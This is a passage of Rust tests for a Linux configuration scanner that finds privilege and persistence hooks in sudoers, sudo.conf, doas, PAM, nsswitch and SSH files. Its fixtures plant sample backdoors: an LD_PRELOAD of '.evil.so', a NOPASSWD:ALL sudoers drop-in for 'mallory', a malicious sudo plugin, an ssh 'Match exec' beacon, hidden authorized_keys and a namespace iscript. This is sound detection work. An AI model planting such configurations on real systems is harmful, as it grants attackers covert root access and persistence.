        put(&d, "home/alice/.ssh/environment", "LD_PRELOAD=/home/alice/.evil.so\n# note\n");
        let s = scan(&d);

        let rc = named(&s, "sshrc");
        assert_eq!(rc.len(), 1);
        assert_eq!(rc[0].raw["symlink_target"], "sshrc.real", "a link is evidence, not a detail");
        assert!(rc[0].command.is_none());
        assert_eq!(rc[0].target_path, Some(d.join("etc/ssh/sshrc")));

        let user_rc = named(&s, "ssh-rc");
        assert_eq!(user_rc.len(), 1);
        assert_eq!(user_rc[0].principal.as_deref(), Some("alice"));

        let env = named(&s, "ssh-environment");
        assert_eq!(env[0].raw["env.LD_PRELOAD"], "/home/alice/.evil.so");
        assert_eq!(env[0].enabled, Enablement::Unknown);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sudoers_is_a_line_scan_that_follows_one_include_level() {
        let d = tree("sudo");
        put(
            &d,
            "etc/sudoers",
            "Defaults\tenv_reset\n\
             Defaults:alice !authenticate\n\
             User_Alias ADMINS = alice, bob\n\
             Cmnd_Alias SHELLS = /bin/bash, /bin/sh\n\
             root ALL=(ALL:ALL) ALL\n\
             alice ALL=(root) NOPASSWD: /bin/bash, \\\n\
             \t/usr/bin/id\n\
             #1000 ALL=(ALL) NOPASSWD: ALL\n\
             # a real comment\n\
             #includedir /etc/sudoers.d\n\
             #include /etc/sudoers.absent\n",
        );
        put(&d, "etc/sudoers.d/90-cloud", "ubuntu ALL=(ALL) NOPASSWD:ALL\n");
        put(&d, "etc/sudoers.d/evil.conf", "mallory ALL=(ALL) NOPASSWD:ALL\n");
        let s = scan(&d);

        for e in &s.entries {
            if e.kind == Kind::Sudoers {
                assert_eq!(e.raw["analysis"], "line-level, aliases resolved");
                assert_eq!(e.trigger, Trigger::Always);
            }
        }

        let alice = s.entries.iter().find(|e| e.name.starts_with("alice:")).unwrap();
        assert_eq!(alice.raw["nopasswd"], "true");
        assert_eq!(alice.raw["tags"], "NOPASSWD");
        assert_eq!(alice.principal.as_deref(), Some("root"));
        assert_eq!(alice.raw["host_list"], "ALL");
        assert_eq!(
            alice.command.as_deref(),
            Some(&b"/bin/bash, \t/usr/bin/id"[..]),
            "the continuation line is part of the same rule"
        );
        assert_eq!(alice.target_path, Some(PathBuf::from("/bin/bash")));

        let uid = s.entries.iter().find(|e| e.name.starts_with("#1000:")).unwrap();
        assert_eq!(uid.raw["nopasswd"], "true");

        let aliases = named(&s, "cmnd_alias:SHELLS");
        assert_eq!(aliases.len(), 1);
        assert_eq!(aliases[0].raw["alias_value"], "/bin/bash, /bin/sh");
        assert!(aliases[0].command.is_none(), "aliases are facts, not resolved policy");

        assert_eq!(
            s.entries.iter().filter(|e| e.raw.contains_key("nopasswd_equivalent")).count(),
            1,
            "Defaults !authenticate is NOPASSWD by another name"
        );

        // The include was followed one level, and the drop-in sudo ignores is
        // reported as inert rather than as an active rule.
        let ubuntu = s.entries.iter().find(|e| e.name.starts_with("ubuntu:")).unwrap();
        assert_eq!(ubuntu.enabled, Enablement::Enabled);
        assert_eq!(
            s.entries.iter().filter(|e| e.name.starts_with("ubuntu:")).count(),
            1,
            "the fixed path and the #includedir must not double-report"
        );
        let mallory = s.entries.iter().find(|e| e.name.starts_with("mallory:")).unwrap();
        assert_eq!(mallory.enabled, Enablement::Disabled);
        assert!(mallory.raw.contains_key("ignored_by_sudo"));

        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_missing_includedir_and_invalid_utf8_are_not_failures() {
        let d = tree("sudojunk");
        let mut bytes: Vec<u8> = Vec::new();
        bytes.extend_from_slice(b"#includedir /etc/sudoers.does-not-exist\n");
        bytes.extend_from_slice(b"#include /etc/sudoers.also-absent\n");
        bytes.extend_from_slice(b"alice ALL=(ALL) NOPASSWD: /bin/");
        bytes.extend_from_slice(&[0xff, 0xfe]);
        bytes.extend_from_slice(b"\n=\n(\nDefaults\n\\\n");
        put(&d, "etc/sudoers", &bytes);
        let s = scan(&d);

        assert!(
            matches!(s.header.collectors[0].status, Status::Complete),
            "an absent include directory is not an unreadable path: {:?}",
            s.header.collectors[0].status
        );
        let inc = named(&s, "include:/etc/sudoers.does-not-exist");
        assert_eq!(inc.len(), 1);
        assert_eq!(inc[0].target_path, Some(PathBuf::from("/etc/sudoers.does-not-exist")));
        assert!(s.entries.iter().any(|e| e.has_flag(Flag::EncodingAnomaly)));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn empty_root_yields_nothing_and_no_error() {
        let d = tree("empty");
        let s = scan(&d);
        assert!(s.entries.is_empty());
        assert!(matches!(s.header.collectors[0].status, Status::Complete));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn fingerprints_match_ssh_keygen() {
        // The empty input's SHA-256, the one fingerprint that is easy to check
        // by hand, plus a real ssh-ed25519 blob.

        let blob = b"AAAAC3NzaC1lZDI1NTE5AAAAIJkBTGfOTNSCBkMmNDIrgX2VXdOdCTr1vAHdGJ3OiRPs";
        let (fp, ok) = fingerprint(blob);
        assert!(ok);
        assert_eq!(fp, "SHA256:FDdeSQ5tHdfDPLTBjVZD+wuRSRc7rABQsZ92BFJrfZk");
    }

    #[test]
    fn module_paths_are_classified_root_relative() {
        assert!(module_is_standard(b"pam_unix.so"));
        assert!(module_is_standard(b"/lib/security/pam_unix.so"));
        assert!(module_is_standard(b"/usr/lib/x86_64-linux-gnu/security/pam_unix.so"));
        assert!(!module_is_standard(b"/usr/lib/security/../../../tmp/x.so"));
        assert!(!module_is_standard(b"/tmp/x.so"));
        assert!(!module_is_standard(b"./x.so"));
    }


    #[test]
    fn a_vendor_stack_replaced_in_etc_is_reported_off() {
        let d = tree("pamvendor");
        put(&d, "etc/pam.d/login", "session optional /opt/admin.so\n");
        put(&d, "usr/lib/pam.d/login", "session optional /opt/vendor.so\n");
        put(&d, "usr/lib/pam.d/polkit-1", "auth optional /opt/only.so\n");
        let s = scan(&d);
        let admin = named(&s, "/opt/admin.so").pop().unwrap();
        let vendor = named(&s, "/opt/vendor.so").pop().unwrap();
        let only = named(&s, "/opt/only.so").pop().unwrap();
        assert_eq!(admin.enabled, Enablement::Enabled);
        assert!(admin.raw["shadows"].ends_with("usr/lib/pam.d/login"));
        assert_eq!(vendor.enabled, Enablement::Disabled, "libpam never reads the replaced stack");
        assert!(vendor.raw["shadowed_by"].ends_with("etc/pam.d/login"));
        assert_eq!(only.enabled, Enablement::Enabled, "a vendor stack with no /etc copy is the one used");
        assert_eq!(only.raw["service"], "polkit-1");
        assert!(!only.raw.contains_key("shadowed_by"));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn nss_modules_are_read_the_way_glibc_reads_nsswitch() {
        let d = tree("nss");
        put(
            &d,
            "etc/nsswitch.conf",
            "# a comment line names no database\n\
             passwd:         files systemd # xyzzy\n\
             group:files [NOTFOUND=return] sss\n\
             \x20 hosts :: files mdns4_minimal [NOTFOUND=return] dns\n\
             netgroup: nis\n\
             sudoers: files plugh\n\
             automount: files ldap\n",
        );
        put(&d, "lib/x86_64-linux-gnu/libnss_systemd.so.2", "");
        put(&d, "lib/x86_64-linux-gnu/glibc-hwcaps/x86-64-v3/libnss_mdns4_minimal.so.2", "");
        put(&d, "lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2", "");
        put(&d, "etc/ld.so.conf", "include /etc/ld.so.conf.d/*.conf\n");
        put(&d, "etc/ld.so.conf.d/sss.conf", "/opt/sss/lib\n");
        put(&d, "opt/sss/lib/libnss_sss.so.2", "");
        let s = scan(&d);

        let mut names: Vec<&str> = s.entries.iter().filter(|e| e.kind == Kind::NssModule).map(|e| e.name.as_str()).collect();
        names.sort_unstable();
        assert_eq!(names, ["#", "mdns4_minimal", "nis", "sss", "systemd", "xyzzy"], "files and dns are libc; sudoers and automount load no module");

        let systemd = named(&s, "systemd").pop().unwrap();
        assert_eq!(systemd.target_path, Some(d.join("lib/x86_64-linux-gnu/libnss_systemd.so.2")));
        assert_eq!(systemd.enabled, Enablement::Enabled);
        assert_eq!(systemd.trigger, Trigger::Always);
        assert!(!systemd.raw.contains_key("after_hash"));

        let hidden = s.entries.iter().find(|e| e.name == "xyzzy").unwrap();
        assert_eq!(hidden.raw["after_hash"], "true", "a person reads it as a comment; glibc loads it");
        assert_eq!(hidden.raw["databases"], "passwd");
        assert_eq!((hidden.enabled, hidden.target_path.clone()), (Enablement::Disabled, None));
        assert_eq!(hidden.raw["library_missing"], "true");

        let mdns = named(&s, "mdns4_minimal").pop().unwrap();
        assert_eq!(mdns.raw["databases"], "hosts", "leading whitespace and a run of colons");
        assert_eq!(
            mdns.target_path,
            Some(d.join("lib/x86_64-linux-gnu/glibc-hwcaps/x86-64-v3/libnss_mdns4_minimal.so.2")),
            "a hwcaps copy is tried first"
        );
        assert!(mdns.raw.contains_key("candidates"));

        let sss = named(&s, "sss").pop().unwrap();
        assert_eq!(sss.raw["databases"], "group", "the action list is not a source");
        assert_eq!(sss.target_path, Some(d.join("opt/sss/lib/libnss_sss.so.2")));
        assert_eq!(named(&s, "nis").pop().unwrap().enabled, Enablement::Disabled);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sudo_conf_is_read_the_way_sudo_reads_it() {
        let d = tree("sudoconf");
        put(
            &d,
            "etc/sudo.conf",
            "# Plugin sudoers_policy /commented/out.so\n\
             \x20  pLuGiN sudoers_policy /opt/evil.so extra=1\n\
             Plugin sudoers_io rel.so\n\
             Path plugin_dir /opt/p\n\
             Path askpass /tmp/first\n\
             PATH ASKPASS /tmp/ask\n\
             Path noexec /opt/n32.so:/opt/n64.so\n\
             Path sesh\n\
             Path devsearch /dev/pts\n\
             Set disable_coredump false\n",
        );
        let s = scan(&d);
        let mut names: Vec<&str> = s.entries.iter().filter(|e| e.kind == Kind::SudoPlugin).map(|e| e.name.as_str()).collect();
        names.sort_unstable();
        assert_eq!(
            names,
            [
                "Path askpass /tmp/ask",
                "Path noexec /opt/n32.so",
                "Path noexec /opt/n64.so",
                "Path plugin_dir",
                "Plugin sudoers_io rel.so",
                "Plugin sudoers_policy /opt/evil.so",
            ],
            "the later askpass wins; an empty sesh and devsearch run nothing"
        );
        let evil = named(&s, "Plugin sudoers_policy /opt/evil.so").pop().unwrap();
        assert_eq!(evil.target_path, Some(PathBuf::from("/opt/evil.so")));
        assert_eq!((evil.trigger, evil.principal.as_deref()), (Trigger::Auth, Some("root")));
        assert_eq!(evil.raw["options"], "extra=1");
        // sudo concatenates: no slash is added.
        let rel = named(&s, "Plugin sudoers_io rel.so").pop().unwrap();
        assert_eq!(rel.target_path, Some(PathBuf::from("/opt/prel.so")));
        std::fs::remove_dir_all(&d).unwrap();

        // A moved plugin_dir alone changes where the default policy loads.
        let d = tree("sudoconf-dir");
        put(&d, "etc/sudo.conf", "Path plugin_dir /opt/plugins/\n");
        let s = scan(&d);
        let default = named(&s, "default policy sudoers.so").pop().unwrap();
        assert_eq!(default.target_path, Some(PathBuf::from("/opt/plugins/sudoers.so")));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sshd_reads_the_key_files_authorized_keys_file_names() {
        let d = tree("keyfiles");
        put(&d, "etc/passwd", "root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\nbob:x:1001:1001::/home/bob:/bin/sh\n");
        std::fs::create_dir_all(d.join("home/bob")).unwrap();
        put(
            &d,
            "etc/ssh/sshd_config",
            "AuthorizedKeysFile /etc/ssh/keys/%u .ssh/authorized_keys\n\
             AuthorizedKeysFile /ignored/%u\n\
             TrustedUserCAKeys /etc/ssh/user_ca.pub\n\
             AuthorizedPrincipalsCommand /usr/local/bin/principals %u\n\
             Match User bob\n\
             \tAuthorizedKeysFile /var/tmp/.k/%U\n",
        );
        let key = |c: &str| format!("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl {c}\n");
        put(&d, "etc/ssh/keys/alice", key("central"));
        put(&d, "home/alice/.ssh/authorized_keys", key("home"));
        put(&d, "home/alice/.ssh/authorized_keys2", key("stale"));
        put(&d, "var/tmp/.k/1001", key("hidden"));
        put(&d, "var/tmp/.k/1000", key("not-alices"));
        put(&d, "ignored/alice", key("second-value"));
        let s = scan(&d);
        let by_comment = |c: &str| s.entries.iter().filter(|e| e.raw.get("comment").map(String::as_str) == Some(c)).collect::<Vec<_>>();

        let central = by_comment("central");
        assert_eq!((central.len(), central[0].enabled), (1, Enablement::Enabled), "%u expanded, absolute path read");
        assert_eq!(central[0].principal.as_deref(), Some("alice"));
        assert_eq!(by_comment("home")[0].enabled, Enablement::Enabled, "a relative path is taken from the home");
        let stale = by_comment("stale");
        assert_eq!(stale[0].enabled, Enablement::Disabled, "a default file the configuration no longer names");
        assert_eq!(stale[0].raw["not_read"], "AuthorizedKeysFile names other files");
        let hidden = by_comment("hidden");
        assert_eq!((hidden.len(), hidden[0].principal.as_deref()), (1, Some("bob")), "%U and the Match block");
        assert_eq!(hidden[0].raw["match"], "User bob");
        assert!(by_comment("not-alices").is_empty(), "the Match block is bob's alone");
        assert!(by_comment("second-value").is_empty(), "sshd takes the first value");
        assert_eq!(named(&s, "AuthorizedKeysFile").iter().filter(|e| e.enabled == Enablement::Disabled).count(), 1);

        let ca = named(&s, "TrustedUserCAKeys").pop().unwrap();
        assert_eq!(ca.target_path, Some(PathBuf::from("/etc/ssh/user_ca.pub")));
        let apc = named(&s, "AuthorizedPrincipalsCommand").pop().unwrap();
        assert_eq!(apc.command.as_deref(), Some(b"/usr/local/bin/principals %u".as_slice()));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn doas_conf_is_read_by_the_rules_opendoas_parses_it_with() {
        use std::os::unix::fs::PermissionsExt;
        let (rules, errs) = doas_rules(
            b"# comment\n\
              permit persist keepenv setenv { PATH=/tmp -HOME } :wheel\n\
              permit nopass alice as root cmd /bin/sh args -c \"id; x\"\n\
              permit nopass bob cmd reboot args\n\
              deny carol\n\
              permit \"as\" as \\\n  root # trailing\n\
              permit nopass persist dave\n\
              frobnicate\n\
              permit eve cmd /usr/bin/vi args \"\"\n\
              permit erin",
        );
        let summary: Vec<String> = rules
            .iter()
            .map(|r| format!("{} {} {:?} {:?}", r.permit, lossy(&r.ident), r.options, r.args.as_ref().map(|a| a.len())))
            .collect();
        assert_eq!(
            summary,
            [
                "true :wheel [\"persist\", \"keepenv\", \"setenv\"] None",
                "true alice [\"nopass\"] Some(2)",
                "true bob [\"nopass\"] Some(0)",
                "false carol [] None",
                "true as [] None",
                "true eve [] Some(1)",
            ],
        );
        assert_eq!(rules[0].setenv, [b"PATH=/tmp".to_vec(), b"-HOME".to_vec()]);
        assert_eq!(rules[1].args.as_ref().unwrap()[1], b"id; x", "quotes group, and are not kept");
        assert_eq!(rules[4].target.as_deref(), Some(&b"root"[..]), "a continuation joins the line");
        assert_eq!(rules[5].args.as_ref().unwrap()[0], b"", "an empty quoted word is an argument");
        assert_eq!(errs.len(), 3, "{errs:?}");
        assert!(errs[0].contains("nopass and persist"));
        assert!(errs[0].contains("line 8") && errs[1].contains("line 9"), "a continued line still counts");
        assert!(errs[2].contains("no newline"));

        // A quoted or continued keyword is a word; an escaped one is not.
        let (rules, _) = doas_rules(b"permit \\\nas as \"cmd\"\n");
        assert_eq!((rules[0].ident.as_slice(), rules[0].target.as_deref()), (&b"as"[..], Some(&b"cmd"[..])));
        // A continuation followed by whitespace leaves the next word a word
        // too, so `nopass` here is who is permitted.
        let (rules, errs) = doas_rules(b"permit \\\n nopass alice\n");
        assert_eq!((rules.len(), errs.len()), (0, 1), "the stray alice is a syntax error");
        let (rules, _) = doas_rules(b"permit \\\n nopass\n");
        assert_eq!((rules[0].ident.as_slice(), rules[0].options.len()), (&b"nopass"[..], 0));
        let long = [b"permit ".as_slice(), &[b'a'; 1024], b"\n"].concat();
        assert!(doas_rules(&long).1[0].contains("too long"), "doas reads a word into 1024 bytes");

        let d = tree("doas");
        put(&d, "etc/doas.conf", "permit nopass alice as root cmd /bin/sh\ndeny bob\npermit :wheel cmd sh\n");
        std::fs::set_permissions(d.join("etc/doas.conf"), PermissionsExt::from_mode(0o644)).unwrap();
        let s = scan(&d);
        let mut names: Vec<String> = s.entries.iter().filter(|e| e.kind == Kind::Doas).map(|e| e.name[..e.name.rfind(':').unwrap()].to_string()).collect();
        names.sort_unstable();
        assert_eq!(names, ["deny:bob", "permit::wheel", "permit:alice"]);
        let alice = named(&s, "permit:alice").pop().unwrap();
        assert_eq!(alice.raw["nopasswd"], "true");
        assert_eq!(alice.target_path, Some(PathBuf::from("/bin/sh")));
        assert_eq!(alice.command.as_deref(), Some(&b"/bin/sh"[..]));
        assert_eq!(alice.raw["args"], "any");
        assert_eq!(named(&s, "permit::wheel").pop().unwrap().target_path, None, "a bare name is searched for");
        // The test runner is not root, so doas would refuse this file.
        if rustix::process::geteuid().is_root() {
            assert_eq!(alice.enabled, Enablement::Enabled);
        } else {
            assert_eq!((alice.enabled, alice.raw["doas_refuses"].as_str()), (Enablement::Disabled, "not owned by root"));
        }
        std::fs::set_permissions(d.join("etc/doas.conf"), PermissionsExt::from_mode(0o666)).unwrap();
        let s = scan(&d);
        assert_eq!(named(&s, "permit:alice").pop().unwrap().raw["doas_refuses"], "writable by group or other");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn ssh_config_lines_split_the_way_readconf_splits_them() {
        let kw = |l: &[u8]| ssh_keyword(l).map(|(k, r)| (String::from_utf8(k).unwrap(), String::from_utf8(r.to_vec()).unwrap()));
        assert_eq!(kw(b"ProxyCommand=nc %h %p"), Some(("proxycommand".into(), "nc %h %p".into())));
        assert_eq!(kw(b"  PROXYCOMMAND = =nc"), Some(("proxycommand".into(), "=nc".into())), "one = is the separator");
        assert_eq!(kw(b"\"Proxy\"Command x"), Some(("proxy".into(), "Command x".into())), "a quote ends the keyword");
        assert_eq!(kw(b"# ProxyCommand x"), None);
        assert_eq!(kw(b"\"ProxyCommand x"), None, "an unclosed quote in the keyword is a line ssh ignores");
        let argv = |l: &[u8]| ssh_argv(l).map(|v| v.into_iter().map(|a| String::from_utf8(a).unwrap()).collect::<Vec<_>>());
        assert_eq!(argv(b"exec \"test -f /x\" host 'a b' c\\ d # rest"), Some(vec!["exec".into(), "test -f /x".into(), "host".into(), "a b".into(), "c d".into()]));
        assert_eq!(argv(b"a\\q \"b\\\"c\""), Some(vec!["a\\q".into(), "b\"c".into()]));
        assert_eq!(argv(b"x#y z"), Some(vec!["x#y".into(), "z".into()]), "# ends the line only where a word starts");
        assert_eq!(argv(b"\"open"), None);
    }

    #[test]
    fn ssh_client_config_is_read_as_ssh_reads_it() {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        let d = tree("sshclient");
        let uid = std::fs::metadata(d.join("etc/passwd")).unwrap().uid();
        put(&d, "etc/passwd", format!("root:x:0:0::/root:/bin/sh\nalice:x:{uid}:{uid}::/home/alice:/bin/sh\nbob:x:{uid}:{uid}::/home/bob:/bin/sh\n"));
        put(&d, "etc/ssh/ssh_config", "Include /etc/ssh/ssh_config.d/*.conf\n\
             Host *\n\
             \x20   ProxyCommand /usr/bin/later %h\n\
             \x20   LocalCommand /usr/local/bin/lc\n\
             \x20   XAuthLocation /opt/xauth\n");
        put(&d, "etc/ssh/ssh_config.d/10-corp.conf", "Host *.corp\n  ProxyCommand /usr/local/bin/corp %h %p\nHost *\n  ProxyCommand=/usr/local/bin/first %h\n");
        put(&d, "home/alice/.ssh/config", "Match exec \"/home/alice/.cache/beacon %h\"\n\
             Host *\n\
             \x20 ProxyJump bastion\n\
             \x20 ProxyCommand /tmp/p\n\
             \x20 PermitLocalCommand yes\n\
             \x20 SecurityKeyProvider internal\n\
             Host db\n\
             \x20 KnownHostsCommand /opt/khc %H\n\
             \x20 PKCS11Provider /opt/pkcs11.so\n\
             Include extra\n");
        put(&d, "home/alice/.ssh/extra", "Host *\nLocalCommand ~/bin/notify %n\n");
        put(&d, "home/bob/.ssh/config", "Match exec \"/tmp/bob-first\"\nProxyCommand /tmp/bob\n");
        for f in ["etc/ssh/ssh_config", "etc/ssh/ssh_config.d/10-corp.conf", "home/alice/.ssh/config", "home/alice/.ssh/extra"] {
            std::fs::set_permissions(d.join(f), PermissionsExt::from_mode(0o644)).unwrap();
        }
        std::fs::set_permissions(d.join("home/bob/.ssh/config"), PermissionsExt::from_mode(0o664)).unwrap();
        let s = scan(&d);
        let get = |dir: &str, principal: Option<&str>, value: &str| -> &Entry {
            s.entries
                .iter()
                .find(|e| e.kind == Kind::SshClient && e.raw["directive"] == dir && e.principal.as_deref() == principal && e.raw["value"] == value)
                .unwrap_or_else(|| panic!("no {dir} {value}"))
        };

        let corp = get("ProxyCommand", None, "/usr/local/bin/corp %h %p");
        assert_eq!((corp.enabled, corp.raw["match"].as_str()), (Enablement::Enabled, "Host *.corp"));
        assert_eq!(corp.target_path, Some(PathBuf::from("/usr/local/bin/corp")));
        assert_eq!(get("ProxyCommand", None, "/usr/local/bin/first %h").enabled, Enablement::Enabled);
        let later = get("ProxyCommand", None, "/usr/bin/later %h");
        assert_eq!(later.enabled, Enablement::Disabled, "the included Host * value came first");
        assert!(later.raw["superseded"].starts_with("/etc/ssh/ssh_config.d/10-corp.conf:4"));
        assert_eq!(get("XAuthLocation", None, "/opt/xauth").target_path, Some(PathBuf::from("/opt/xauth")));
        // alice's file permits local commands, so the system one may run.
        assert_eq!(get("LocalCommand", None, "/usr/local/bin/lc").enabled, Enablement::Enabled);

        let beacon = get("Match exec", Some("alice"), "/home/alice/.cache/beacon %h");
        assert_eq!((beacon.enabled, beacon.trigger), (Enablement::Enabled, Trigger::Always));
        assert_eq!(beacon.command.as_deref(), Some(&b"/home/alice/.cache/beacon %h"[..]));
        let p = get("ProxyCommand", Some("alice"), "/tmp/p");
        assert_eq!(p.enabled, Enablement::Disabled, "ProxyJump took the slot");
        assert_eq!(get("SecurityKeyProvider", Some("alice"), "internal").enabled, Enablement::Disabled);
        let khc = get("KnownHostsCommand", Some("alice"), "/opt/khc %H");
        assert_eq!((khc.enabled, khc.raw["match"].as_str()), (Enablement::Enabled, "Host db"));
        assert_eq!(get("PKCS11Provider", Some("alice"), "/opt/pkcs11.so").target_path, Some(PathBuf::from("/opt/pkcs11.so")));
        let notify = get("LocalCommand", Some("alice"), "~/bin/notify %n");
        assert_eq!((notify.enabled, notify.raw["match"].as_str()), (Enablement::Enabled, "Host db / Host *"), "an Include inside a block is under it");
        assert_eq!(notify.source, d.join("home/alice/.ssh/extra"));

        // bob's file is group-writable: ssh refuses before running anything.
        for e in s.entries.iter().filter(|e| e.principal.as_deref() == Some("bob")) {
            assert_eq!(e.enabled, Enablement::Disabled, "{}", e.name);
            assert!(e.raw["ssh_refuses"].contains("bad permissions"));
        }
        std::fs::remove_dir_all(&d).unwrap();

        // An earlier value under the same condition wins wherever the later
        // one would apply; `ProxyJump none` holds ProxyJump but lets a later
        // ProxyCommand through, as ssh 9.6 does.
        let d = tree("sshclient-cover");
        put(&d, "etc/ssh/ssh_config", "Host db
  ProxyJump bastion
Host web
  ProxyJump none
  ProxyJump bastion
Host db web
  ProxyCommand /opt/pc %h
Host db
  ProxyCommand /opt/db
Host web
  ProxyCommand /opt/web
PKCS11Provider /opt/a.so extra
");
        let s = scan(&d);
        let named_value = |v: &str| s.entries.iter().find(|e| e.kind == Kind::SshClient && e.raw["value"] == v).unwrap();
        let superseded = |v: &str| named_value(v).raw.contains_key("superseded");
        assert!(!superseded("/opt/pc %h"), "Host db web is not only db");
        assert!(named_value("/opt/db").raw["superseded"].ends_with("ssh_config:2 sets it first wherever this applies"));
        assert!(!superseded("/opt/web"), "none held the slot, and the jump after it was ignored");
        assert!(named_value("/opt/pc %h").raw["ssh_refuses"].contains("bad configuration line"), "one word, and nothing after it");
        std::fs::remove_dir_all(&d).unwrap();

        // No PermitLocalCommand anywhere: a LocalCommand never runs. A bad
        // system line stops every ssh once the file is read, and a Match
        // exec anywhere in it has run by then.
        let d = tree("sshclient-local");
        put(&d, "etc/ssh/ssh_config", "Match exec /opt/early\nLocalCommand /opt/lc\nProxyCommand \"unclosed\nMatch exec /opt/late\n");
        let s = scan(&d);
        let named_value = |v: &str| s.entries.iter().find(|e| e.kind == Kind::SshClient && e.raw["value"] == v).unwrap();
        assert_eq!(named_value("/opt/early").enabled, Enablement::Enabled);
        let lc = named_value("/opt/lc");
        assert_eq!(lc.enabled, Enablement::Disabled);
        assert!(lc.raw["ssh_refuses"].contains("bad configuration line"));
        assert_eq!(named_value("/opt/late").enabled, Enablement::Enabled, "ssh reads the whole file before it gives up");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn namespace_init_runs_where_pam_namespace_and_a_polydir_use_it() {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(
            namespace_words(b"  /tmp \"/tmp/inst a\"/ tmpdir:iscript=x\\ y  # root,adm"),
            [b"/tmp".to_vec(), b"/tmp/inst a/".to_vec(), b"tmpdir:iscript=x y".to_vec()]
        );
        let d = tree("pamns");
        put(&d, "etc/security/namespace.init", "#!/bin/sh\n");
        std::fs::set_permissions(d.join("etc/security/namespace.init"), PermissionsExt::from_mode(0o755)).unwrap();
        put(&d, "etc/security/namespace.conf", "# $HOME/tmp $HOME/tmp.inst/ user root\n/tmp /tmp-inst/ level root,adm\n");
        let s = scan(&d);
        let init = named(&s, "namespace.init").pop().unwrap();
        assert_eq!((init.enabled, init.trigger), (Enablement::Disabled, Trigger::Login));
        assert_eq!(init.raw["not_run"], "no session stack loads pam_namespace.so");
        assert_eq!(init.target_path, Some(d.join("etc/security/namespace.init")));

        put(&d, "etc/pam.d/login", "session required pam_namespace.so\n");
        put(&d, "etc/security/namespace.conf", "/tmp /tmp-inst/ tmpdir:noinit root\n$HOME/x $HOME/x.inst/ user:iscriptx\n/var/tmp /var/tmp/inst/ user:iscript=/opt/evil.sh\ntmp rel/ user\n/a/../b /i/ user:iscript=/opt/skipped\n");
        put(&d, "etc/security/namespace.d/10-web.conf", "/srv/tmp /srv/inst/ tmpfs:create=0700:iscript=web.sh\n");
        let s = scan(&d);
        let init = named(&s, "namespace.init").into_iter().find(|e| e.name == "namespace.init").unwrap();
        assert_eq!(init.enabled, Enablement::Enabled);
        assert_eq!((init.raw["services"].as_str(), init.raw["polydirs"].as_str()), ("login", "$HOME/x"), "iscript with no = keeps the default");
        let evil = named(&s, "namespace.init:/opt/evil.sh").pop().unwrap();
        assert_eq!((evil.enabled, evil.principal.as_deref()), (Enablement::Enabled, Some("root")));
        assert_eq!(evil.source, d.join("etc/security/namespace.conf"));
        let web = named(&s, "namespace.init:/etc/security/namespace.d/web.sh").pop().unwrap();
        assert_eq!(web.source, d.join("etc/security/namespace.d/10-web.conf"));
        assert!(named(&s, "/opt/skipped").is_empty(), "pam_namespace skips a path with ..");

        std::fs::set_permissions(d.join("etc/security/namespace.init"), PermissionsExt::from_mode(0o644)).unwrap();
        let s = scan(&d);
        let init = named(&s, "namespace.init").into_iter().find(|e| e.name == "namespace.init").unwrap();
        assert_eq!((init.enabled, init.raw["not_run"].as_str()), (Enablement::Disabled, "not executable, which fails the session"));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_dropped_or_weakened_mfa_line_shows_in_a_baseline_diff() {
        use crate::diff::{Delta, diff};
        let d = tree("mfa");
        let stack = |u2f: &str| format!("auth required pam_unix.so\n{u2f}account required pam_unix.so\n");
        put(&d, "etc/pam.d/sshd", stack("auth required pam_u2f.so cue\n"));
        let before = scan(&d);

        // Removed outright, or commented out: the same removed row.
        for gone in ["", "#auth required pam_u2f.so cue\n"] {
            put(&d, "etc/pam.d/sshd", stack(gone));
            let rows = diff(&before, &scan(&d)).unwrap();
            let changed: Vec<_> = rows.iter().filter(|r| r.delta != Delta::Unchanged).collect();
            assert_eq!(changed.len(), 1, "{:?}", changed.iter().map(|r| &r.entry.name).collect::<Vec<_>>());
            assert_eq!((changed[0].entry.name.as_str(), &changed[0].delta), ("sshd:auth:pam_u2f.so", &Delta::Removed));
        }

        // Still there, but no longer able to fail the stack.
        put(&d, "etc/pam.d/sshd", stack("auth optional pam_u2f.so cue\n"));
        let rows = diff(&before, &scan(&d)).unwrap();
        let u2f = rows.iter().find(|r| r.entry.name == "sshd:auth:pam_u2f.so").unwrap();
        assert!(matches!(&u2f.delta, Delta::Changed { .. }), "{:?}", u2f.delta);
        assert_eq!(u2f.entry.raw["control"], "optional");
        std::fs::remove_dir_all(&d).unwrap();
    }
    #[test]
    fn nested_aliases_that_multiply_are_cut_off_not_expanded() {
        // Forty levels, two references each, no cycle: visudo accepts it,
        // and expanding it is 2^40 members.
        let mut sudoers = String::new();
        for i in (0..40).rev() {
            let next = if i == 39 { "/bin/true".to_string() } else { format!("C{}, C{}", i + 1, i + 1) };
            sudoers.push_str(&format!("Cmnd_Alias C{i} = {next}\n"));
        }
        sudoers.push_str("alice ALL = (root) NOPASSWD: C0\n");
        let d = std::env::temp_dir().join(format!("unbidden-sudo-multiply-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("etc")).unwrap();
        std::fs::write(d.join("etc/sudoers"), sudoers).unwrap();
        let started = std::time::Instant::now();
        let root = crate::root::Root::at(&d).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Auth)];
        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
        assert!(started.elapsed() < std::time::Duration::from_secs(5), "took {:?}", started.elapsed());
        let spec = s.entries.iter().find(|e| e.raw.contains_key("alias_expansion_truncated")).expect("the cut is on the entry");
        assert!(spec.raw["alias_expansion_truncated"].contains("2048"));
